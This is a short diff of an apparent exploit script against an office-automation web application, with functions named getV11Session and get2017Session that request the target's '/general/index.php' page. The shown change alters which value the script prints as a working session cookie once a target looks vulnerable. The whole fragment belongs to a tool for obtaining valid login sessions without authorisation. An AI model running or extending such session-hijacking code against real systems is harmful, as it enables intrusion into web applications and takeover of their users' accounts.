@@ -65,7 +65,7 @@ def getV11Session(url):
         check_available = requests.get(url + '/general/index.php',headers=headers)
         if '用户未登录' not in check_available.text:
             if '重新登录' not in check_available.text:
-                print('[+]Get Available COOKIE:' + res.headers['Set-Cookie'])
+                print('[+]Get Available COOKIE:' + tmp_cookie)
         else:
             print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
     except:
@@ -94,7 +94,7 @@ def get2017Session(url):
             check_available = requests.get(url + '/general/index.php',headers=headers)
             if '用户未登录' not in check_available.text:
                 if '重新登录' not in check_available.text:
-                    print('[+]Get Available COOKIE:' + res.headers['Set-Cookie'])
+                    print('[+]Get Available COOKIE:' + tmp_cookie)
             else:
                 print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')
         else:
